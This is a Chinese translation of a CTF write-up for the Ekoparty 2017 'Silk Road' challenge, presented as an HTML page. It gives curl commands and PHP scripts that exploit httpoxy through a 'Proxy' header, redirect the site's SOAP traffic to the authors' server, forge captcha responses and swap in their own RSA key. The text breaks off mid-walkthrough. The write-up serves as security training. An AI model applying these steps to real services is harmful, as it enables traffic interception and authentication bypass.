@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta http-equiv="content-language" content="zh-CN" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=0.5">
+    
+    
+    <title>Ekoparty 2017: 丝绸之路（译）</title>
+
+    
+
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/4.2.0/anchor.min.js"></script>
+        <script>
+            document.addEventListener("DOMContentLoaded", function(event) {
+                anchors.options = {
+                visible: 'hover',
+                placement: 'left',
+                icon: "¶"
+                };
+            anchors.add();
+            })
+        </script>
+        
+        
+
+        
+            <script src="https://cdn.bootcss.com/clipboard.js/2.0.4/clipboard.min.js"></script>
+            <link href="https://clipboardjs.com/bower_components/primer-css/css/primer.css" rel="stylesheet">
+            
+        
+
+        
+        
+        <style type="text/css">
+            body {background-color: #fbf6ec;}
+        </style>
+        
+
+        
+        
+             <link rel="stylesheet" href="/css/main.css"></link> <link rel="stylesheet" href="/css/stylesheet.css"></link> <link rel="stylesheet" href="https://codisec.com/wp-content/themes/codisec-strappress/style.css?ver=3.3.6"></link>
+        
+
+        
+    
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css" rel="stylesheet">
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js"></script>
+    
+
+    
+    
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    
+
+</head>
+
+
+<body>
+    <script>
+        window.addEventListener("resize", resizeThrottler, false);
+
+        var resizeTimeout;
+        function resizeThrottler() {
+        
+        if ( !resizeTimeout ) {
+            resizeTimeout = setTimeout(function() {
+            resizeTimeout = null;
+            actualResizeHandler();
+        
+            
+            }, 66);
+        }
+        }
+        actualResizeHandler()
+        function actualResizeHandler() {
+                if (/mobile/i.test(navigator.userAgent) || /android/i.test(navigator.userAgent))
+                {
+                    document.body.classList.add('mobile');
+                }else{
+                    document.body.classList.remove('mobile');  
+                }
+    }</script>
+
+    
+    
+
+
+    
+
+<div class="inner" style="position:relative;">
+  
+  <div class="side-btn"><a href="/pass-blog/" class="back">Home</a></div>
+  
+<div class="blog-post">
+  <h2>Ekoparty 2017: 丝绸之路（译）</h2>
+        
+
+<style>
+body{
+    background-color: #272b30;
+    color:#f9f1f1;
+    font-size:1.1em;
+}
+
+a {
+  color:#f1851a;
+}
+
+pre {
+    background-color: #272b30;
+    font-weight: 500;
+    font-size: 1rem;
+}
+
+p {
+    color: #c8c8c8;
+}
+
+li code,
+p code {
+    background-color: rgb(34, 40, 42) !important;
+    color: #f1851a;
+}
+div.inner {
+    background-color: #272b30;
+}
+</style>
+
+<h2 id="博文来源">博文来源</h2>
+
+<blockquote>
+<p><a href="https://codisec.com/ekoparty-2017-silk-road/">源文</a> ：2017 9-21 ，作者：<a href="https://codisec.com/author/krzysztof-stopczanski/">Krzysztof Stopczański</a></p>
+</blockquote>
+
+<p>CTF：EKOPARTY 2017
+积分：496
+类别：网络</p>
+
+<h2 id="描述">描述</h2>
+
+<blockquote>
+<p>“我们永远不会再犯同样的错误，我们向你挑战，来吧，阅读我们的信息，看看你能不能获得一些 BTC！” - DPR</p>
+
+<p><a href="https://silkroadzpvwzxxv.onion/">https://silkroadzpvwzxxv.onion/</a></p>
+</blockquote>
+
+<p>在此网络挑战中，我们在 TOR 网络中，展示了一个网站。要访问它，我们可以使用<a href="https://www.torproject.org/projects/torbrowser.html.en">Tor 浏览器</a>，并使用像 curl 这样的命令行工具 torify，但 Tor 网络专用：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">torify curl -v -k <span style="color:#f1fa8c">&#34;https://silkroadzpvwzxxv.onion/&#34;</span></code></pre></div>
+<p>该网站包含两个页面：</p>
+
+<ul>
+<li>1）登录面板：</li>
+</ul>
+
+<p><img src="https://codisec.com/wp-content/uploads/2017/09/pic1-1024x560.png" alt="login"></p>
+
+<ul>
+<li>2）在<code>/register</code>的注册面板，结果发现是不能用的&hellip;</li>
+</ul>
+
+<p><img src="https://codisec.com/wp-content/uploads/2017/09/pic2-1024x560.png" alt="register"></p>
+
+<p>测试 SQL 注入等常见漏洞，并没有带来任何用处。
+让我们来看看标题：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ torify curl -I -k <span style="color:#f1fa8c">&#34;https://silkroadzpvwzxxv.onion/&#34;</span>
+HTTP/1.1 <span style="color:#bd93f9">200</span> OK
+Date: Mon, <span style="color:#bd93f9">18</span> Sep <span style="color:#bd93f9">2017</span> <span style="color:#bd93f9">11</span>:10:02 GMT
+Server: Apache
+Set-Cookie: <span style="color:#8be9fd;font-style:italic">PHPSESSID</span><span style="color:#ff79c6">=</span>rsg6p15vnm7quglb9kte9e9sb0; <span style="color:#8be9fd;font-style:italic">path</span><span style="color:#ff79c6">=</span>/
+Expires: Thu, <span style="color:#bd93f9">19</span> Nov <span style="color:#bd93f9">1981</span> <span style="color:#bd93f9">08</span>:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+X-Powered-By: PHP/7.0.8
+Content-Type: text/html; <span style="color:#8be9fd;font-style:italic">charset</span><span style="color:#ff79c6">=</span>UTF-8</code></pre></div>
+<p>这里有趣的是， PHP 的这个版本，让我们试着找一些漏洞。
+在 Google 中搜索 php 7.0.8 漏洞，会让我们看到一些非常有趣的内容：
+<a href="http://www.securiteam.com/securitynews/5YP321PJQC.html">http://www.securiteam.com/securitynews/5YP321PJQC.html</a></p>
+
+<p>有关此漏洞的更多信息
+<a href="https://httpoxy.org/">https://httpoxy.org/</a></p>
+
+<p>快速测试：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ torify curl -v -k <span style="color:#f1fa8c">&#34;https://silkroadzpvwzxxv.onion/&#34;</span> -H <span style="color:#f1fa8c">&#34;Proxy: google.com&#34;</span>
+…
+HTTP/1.0 <span style="color:#bd93f9">500</span> Internal Server Error</code></pre></div>
+<p>掌声！我们崩溃了应用程序！</p>
+
+<p>现在让我们使用 Tinyproxy 设置 amazon 实例，并将其设置为，把流量重定向到本地 Apache 服务器。请求使用了 HTTPS 协议，因此我们还需要一个域名（由<a href="https://www.noip.com/">No-IP</a>免费提供）和 SSL 证书（<a href="http://www.letsencrypt.org">Let’s Encrypt</a>上也是免费的）</p>
+
+<p>成功设置我们的服务器后，让我们看看，正在发送的请求：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ torify curl -k <span style="color:#f1fa8c">&#34;https://silkroadzpvwzxxv.onion/&#34;</span> -H <span style="color:#f1fa8c">&#34;Proxy: ourserver.hopto.org&#34;</span></code></pre></div>
+<p>现在，我们可以找找我们服务器上的 <code>/var/log/apache2/access.log</code> ，并查看：</p>
+
+<pre><code>127.0.0.1 - - [18/Sep/2017:11:39:29 +0000] &quot;POST /d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php HTTP/1.1&quot; 404 3750 &quot;-&quot; &quot;PHP-SOAP/7.0.22-0ubuntu0.17.04.1&quot;
+</code></pre>
+
+<p><code>/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php</code> 是挑战网站中的有效路径，但是当使用 <code>GET</code> 调用它时，它只返回一个空页面。我们现在创建一个文件 <code>/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php</code>，在我们的网络服务器中，看看来自 挑战服务器的请求是什么：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?php</span>
+<span style="color:#8be9fd;font-style:italic">$req_dump</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>;
+<span style="color:#8be9fd;font-style:italic">$headers</span> <span style="color:#ff79c6">=</span> getallheaders();
+
+<span style="color:#ff79c6">foreach</span>(<span style="color:#8be9fd;font-style:italic">$headers</span> <span style="color:#ff79c6">as</span> <span style="color:#8be9fd;font-style:italic">$key</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#8be9fd;font-style:italic">$val</span>)
+{
+	<span style="color:#8be9fd;font-style:italic">$req_dump</span><span style="color:#ff79c6">.=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">$key</span><span style="color:#f1fa8c"> : </span><span style="color:#f1fa8c">$val</span><span style="color:#f1fa8c"> </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>;
+}
+
+<span style="color:#8be9fd;font-style:italic">$req_dump</span><span style="color:#ff79c6">.=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">.</span> print_r(file_get_contents(<span style="color:#f1fa8c">&#39;php://input&#39;</span>) , <span style="color:#ff79c6">TRUE</span>);
+<span style="color:#8be9fd;font-style:italic">$fp</span> <span style="color:#ff79c6">=</span> fopen(<span style="color:#f1fa8c">&#39;request.log&#39;</span>, <span style="color:#f1fa8c">&#39;a&#39;</span>);
+fwrite(<span style="color:#8be9fd;font-style:italic">$fp</span>, <span style="color:#8be9fd;font-style:italic">$req_dump</span>);
+fclose(<span style="color:#8be9fd;font-style:italic">$fp</span>);
+<span style="color:#ff79c6">?&gt;</span>
+</code></pre></div>
+<p>再次使用 <code>Proxy</code> 标头发出请求后，我们可以在 <code>request.log</code> 中看到请求的内容：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Host : hiddenservicehost
+Connection : close
+User-Agent : PHP-SOAP/7.0.22-0ubuntu0.17.04.1
+Content-Type : text/xml; <span style="color:#8be9fd;font-style:italic">charset</span><span style="color:#ff79c6">=</span>utf-8
+SOAPAction : <span style="color:#f1fa8c">&#34;https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/getCaptchaWord&#34;</span>
+Content-Length : <span style="color:#bd93f9">655</span>
+
+&lt;?xml <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#8be9fd;font-style:italic">encoding</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>?&gt;
+&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> xmlns:ns1<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/&#34;</span> xmlns:xsd<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> xmlns:xsi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> xmlns:SOAP-ENC<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span> SOAP-ENV:encodingStyle<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span>&gt;
+  &lt;SOAP-ENV:Body&gt;
+    &lt;ns1:getCaptchaWord&gt;
+      &lt;guid xsi:type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span>&gt;6FF45265-5073-8C1B-1BE4-8DD77E546EE0&lt;/guid&gt;
+      &lt;IP xsi:type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span>&gt;127.0.0.1&lt;/IP&gt;
+      &lt;length xsi:type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;xsd:int&#34;</span>&gt;6&lt;/length&gt;
+    &lt;/ns1:getCaptchaWord&gt;
+  &lt;/SOAP-ENV:Body&gt;
+&lt;/SOAP-ENV:Envelope&gt;</code></pre></div>
+<p>结果发现，<code>hiddenservice_ws.php</code> 提供的是 SOAP API，查询本身用于生成验证字。有趣的事实 - 最初的丝绸之路，是被泄漏的验证码追踪到的（至少 FBI 声称是这样的），更多关于它：<a href="https://krebsonsecurity.com/2014/09/dread-pirate-sunk-by-leaky-captcha/">https://krebsonsecurity.com/2014/09/dread-pirate-sunk-by-leaky-captcha/</a> - 很好的 Ekoparty 尝试;）。
+现在有了我们的代理黑客，我们可以：</p>
+
+<ul>
+<li>查看服务器查询，</li>
+<li>将有效查询，发送到真实 API，</li>
+<li>用我们自己的响应，改变了响应。</li>
+</ul>
+
+<p>知道这一点后，我们可以尝试登录该服务。将上述请求发送到真正的 <code>hiddenservice_ws.php</code>，会返回以下输出：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ torify curl -k <span style="color:#f1fa8c">&#34;https://silkroadzpvwzxxv.onion/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php&#34;</span> -H <span style="color:#f1fa8c">&#34;Host: hiddenservicehost&#34;</span> -H <span style="color:#f1fa8c">&#34;Content-Type: text/xml; charset=utf-8&#34;</span> -H <span style="color:#f1fa8c">&#34;SOAPAction: https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/getCaptchaWord&#34;</span> --data @data.xml
+
+&lt;?xml <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#8be9fd;font-style:italic">encoding</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>?&gt;
+&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> xmlns:ns1<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://localhost/&#34;</span> xmlns:xsd<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> xmlns:xsi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> xmlns:SOAP-ENC<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span> SOAP-ENV:encodingStyle<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span>&gt;
+  &lt;SOAP-ENV:Body&gt;
+    &lt;ns1:getCaptchaWordResponse&gt;
+      &lt;<span style="color:#ff79c6">return</span> xsi:type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span>&gt;wsjnDR&lt;/return&gt;
+    &lt;/ns1:getCaptchaWordResponse&gt;
+  &lt;/SOAP-ENV:Body&gt;
+&lt;/SOAP-ENV:Envelope&gt;</code></pre></div>
+<p>现在，让我们改变我们的脚本假装成一个服务器，并让它将这个响应发回去：</p>
+
+<blockquote>
+<p>假的 SOAP 服务器 – part 1</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?php</span>
+<span style="color:#8be9fd;font-style:italic">$input</span> <span style="color:#ff79c6">=</span> print_r(file_get_contents(<span style="color:#f1fa8c">&#39;php://input&#39;</span>) , <span style="color:#ff79c6">TRUE</span>);
+<span style="color:#8be9fd;font-style:italic">$fp</span> <span style="color:#ff79c6">=</span> fopen(<span style="color:#f1fa8c">&#39;request.log&#39;</span>, <span style="color:#f1fa8c">&#39;a&#39;</span>);
+fwrite(<span style="color:#8be9fd;font-style:italic">$fp</span>, <span style="color:#8be9fd;font-style:italic">$input</span>);
+fclose(<span style="color:#8be9fd;font-style:italic">$fp</span>);
+header(<span style="color:#f1fa8c">&#39;Content-Type: text/xml; charset=utf-8&#39;</span>);
+
+<span style="color:#ff79c6">if</span> (strstr(<span style="color:#8be9fd;font-style:italic">$input</span>, <span style="color:#f1fa8c">&#39;getCaptchaWord&#39;</span>) <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">False</span>)
+{
+<span style="color:#ff79c6">?&gt;</span>
+<span style="color:#ff79c6">&lt;?</span>xmlversion <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;1.0&#34;</span>encoding <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;UTF-8&#34;</span> <span style="color:#ff79c6">?&gt;</span>
+&lt;<span style="color:#ff79c6">SOAP-ENV:Envelope</span> <span style="color:#50fa7b">xmlns:SOAP-ENV</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> <span style="color:#50fa7b">xmlns:ns1</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://localhost/&#34;</span> <span style="color:#50fa7b">xmlns:xsd</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span style="color:#50fa7b">xmlns:xsi</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#50fa7b">xmlns:SOAP-ENC</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span> <span style="color:#50fa7b">SOAP-ENV:encodingStyle</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span>&gt;&lt;<span style="color:#ff79c6">SOAP-ENV:Body</span>&gt;&lt;<span style="color:#ff79c6">ns1:getCaptchaWordResponse</span>&gt;&lt;<span style="color:#ff79c6">return</span> <span style="color:#50fa7b">xsi:type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span>&gt;wsjnDR&lt;/<span style="color:#ff79c6">return</span>&gt;&lt;/<span style="color:#ff79c6">ns1:getCaptchaWordResponse</span>&gt;&lt;/<span style="color:#ff79c6">SOAP-ENV:Body</span>&gt;&lt;/<span style="color:#ff79c6">SOAP-ENV:Envelope</span>&gt;
+<span style="color:#ff79c6">&lt;?php</span>
+}
+<span style="color:#ff79c6">?&gt;</span>
+</code></pre></div>
+<p>我们得到的下一个请求：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#ff79c6">&lt;SOAP-ENV:Envelope</span> <span style="color:#50fa7b">xmlns:SOAP-ENV=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> <span style="color:#50fa7b">xmlns:ns1=</span><span style="color:#f1fa8c">&#34;https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/&#34;</span> <span style="color:#50fa7b">xmlns:xsi=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#50fa7b">xmlns:xsd=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span style="color:#50fa7b">xmlns:SOAP-ENC=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span> <span style="color:#50fa7b">SOAP-ENV:encodingStyle=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span><span style="color:#ff79c6">&gt;</span>
+  <span style="color:#ff79c6">&lt;SOAP-ENV:Body&gt;</span>
+    <span style="color:#ff79c6">&lt;ns1:checkCaptchaWord&gt;</span>
+      <span style="color:#ff79c6">&lt;guid</span> <span style="color:#50fa7b">xsi:nil=</span><span style="color:#f1fa8c">&#34;true&#34;</span><span style="color:#ff79c6">/&gt;</span>
+      <span style="color:#ff79c6">&lt;word</span> <span style="color:#50fa7b">xsi:type=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span><span style="color:#ff79c6">&gt;</span>123456<span style="color:#ff79c6">&lt;/word&gt;</span>
+    <span style="color:#ff79c6">&lt;/ns1:checkCaptchaWord&gt;</span>
+  <span style="color:#ff79c6">&lt;/SOAP-ENV:Body&gt;</span>
+<span style="color:#ff79c6">&lt;/SOAP-ENV:Envelope&gt;</span></code></pre></div>
+<p>再来 —— 我们将它发送到真正的服务器，并检查响应：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ torify curl -k <span style="color:#f1fa8c">&#34;https://silkroadzpvwzxxv.onion/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php&#34;</span> -H <span style="color:#f1fa8c">&#34;Host: hiddenservicehost&#34;</span> -H <span style="color:#f1fa8c">&#34;Content-Type: text/xml; charset=utf-8&#34;</span> -H <span style="color:#f1fa8c">&#34;SOAPAction: https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/getCaptchaWord&#34;</span> --data @data.xml
+
+&lt;?xml <span style="color:#8be9fd;font-style:italic">version</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#8be9fd;font-style:italic">encoding</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span>?&gt;
+&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> xmlns:ns1<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://localhost/&#34;</span> xmlns:xsd<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> xmlns:xsi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> xmlns:SOAP-ENC<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span> SOAP-ENV:encodingStyle<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span>&gt;
+  &lt;SOAP-ENV:Body&gt;
+    &lt;ns1:checkCaptchaWordResponse&gt;
+      &lt;<span style="color:#ff79c6">return</span> xsi:type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;xsd:boolean&#34;</span>&gt;false&lt;/return&gt;
+    &lt;/ns1:checkCaptchaWordResponse&gt;
+  &lt;/SOAP-ENV:Body&gt;
+&lt;/SOAP-ENV:Envelope&gt;</code></pre></div>
+<p>让我们稍微改变一下 —— 把</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;return</span> <span style="color:#50fa7b">xsi:type=</span><span style="color:#f1fa8c">&#34;xsd:boolean&#34;</span><span style="color:#ff79c6">&gt;</span>false<span style="color:#ff79c6">&lt;/return&gt;</span></code></pre></div>
+<p>替换成：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;return</span> <span style="color:#50fa7b">xsi:type=</span><span style="color:#f1fa8c">&#34;xsd:boolean&#34;</span><span style="color:#ff79c6">&gt;</span>true<span style="color:#ff79c6">&lt;/return&gt;</span></code></pre></div>
+<p>因此，我们总是通过验证码验证，并将其放入我们的假 SOAP 服务器中：</p>
+
+<blockquote>
+<p>假的 SOAP 服务器 – part 2</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">else if(strstr($input, &#39;checkCaptchaWord&#39;) !== False)
+{
+?&gt;
+<span style="color:#ff79c6">&lt;?</span>xml version<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> encoding<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span><span style="color:#ff79c6">?&gt;</span>
+...&lt;<span style="color:#ff79c6">return</span> <span style="color:#50fa7b">xsi:type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;xsd:boolean&#34;</span>&gt;true&lt;/<span style="color:#ff79c6">return</span>&gt;...
+</code></pre></div>
+<p>我们假服务器，从 Web 服务器收到的下一个请求是：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#ff79c6">&lt;SOAP-ENV:Envelope</span> <span style="color:#50fa7b">xmlns:SOAP-ENV=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> <span style="color:#50fa7b">xmlns:ns1=</span><span style="color:#f1fa8c">&#34;https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/&#34;</span> <span style="color:#50fa7b">xmlns:xsd=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span style="color:#50fa7b">xmlns:xsi=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#50fa7b">xmlns:SOAP-ENC=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span> <span style="color:#50fa7b">SOAP-ENV:encodingStyle=</span><span style="color:#f1fa8c">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span><span style="color:#ff79c6">&gt;</span>
+  <span style="color:#ff79c6">&lt;SOAP-ENV:Body&gt;</span>
+    <span style="color:#ff79c6">&lt;ns1:getPublicKey&gt;</span>
+      <span style="color:#ff79c6">&lt;format</span> <span style="color:#50fa7b">xsi:type=</span><span style="color:#f1fa8c">&#34;xsd:string&#34;</span><span style="color:#ff79c6">&gt;</span>PEM<span style="color:#ff79c6">&lt;/format&gt;</span>
+    <span style="color:#ff79c6">&lt;/ns1:getPublicKey&gt;</span>
+  <span style="color:#ff79c6">&lt;/SOAP-ENV:Body&gt;</span>
+<span style="color:#ff79c6">&lt;/SOAP-ENV:Envelope&gt;</span></code></pre></div>
+<p>这就是对公钥的请求 —— 似乎会进行一些加密。让我们从真正的 SOAP 服务器，下载密钥，并将其保存，以供以后使用：</p>
+
+<pre><code>…
+&lt;ns1:getPublicKeyResponse&gt;&lt;return xsi:type=&quot;xsd:string&quot;&gt;
+-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAw3vXUQ0nUkDejmMAamcT
+fsEAgiqy05tZzP7IIrjnWIrA5acJqxctGLDAq36+mHSgAiuPeH2cZFQ3930P3V/V
+AZCpwM45FqbHn/C0cqt5aV7GbjJQBnpBJj0fNMChvv2XWOWUzS+MABgj8ViZ/6p8
+XJIo0HfTaPP5X8ASmRfG0XEpTI8/GKnDcDK3iv+zfleWzBSZeitkD+KJxVU3Wkni
+CijMadbAXzdEm3H4Mw32Yzv92oU3lyMmboh9p24aiwSQctRDm9/N4hRNC7ZTM5FG
+TSoTtCxcfAT3SU3wI2erGIDdHxnXOp3wGbxC+oM2LBOUt731SR4zo0StrQu4Sl8r
+uUo92vUeoJ/nKAfEcN84CP1n5BIx58JWu8rU8V3nZOM+YIpQFS3HgdGUszWcChtv
+yH4I5337YcuNuBiGyQo46YY1KR5WiXWryz1blpXzyVvELlUoz+o2BsAO/bwaFtaW
+JTejXqBUGG9NVLmk239UHU3+NxghgH8QrrQV9bWkX25IDNaSVsllzO53hv/Kn2rd
+AVb4qfonC+J9YFkoTQ4sIwN+Jtv+0AkNuDAlp0Zo3rFW9+vhs4bl6CGrP+Llq72h
+zAzGZgHXmB8zTXljc2yUyARY2kMyTHYa77uW2v8tyFUn8YxIrgiXwAPqDP/oQILB
++okQlWmlmCfYEnRlQVA44HECAwEAAQ==
+-----END PUBLIC KEY-----
+</code></pre>
+
+<p>现在，让我们为与网页的伪造通信，生成自己的密钥对：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl genpkey -algorithm RSA -out my_key/private_key.pem -pkeyopt rsa_keygen_bits:2048
+openssl rsa -pubout -in my_key/private_key.pem -out my_key/public_key.pem</code></pre></div>
+<p>让我们继续创建对， <code>getPublicKey</code> 的假响应，这次使用我们自己的密钥，并继续进行身份验证过程：</p>
+
+<blockquote>
+<p>假的 SOAP 服务器 – part 3</p>
+</blockquote>
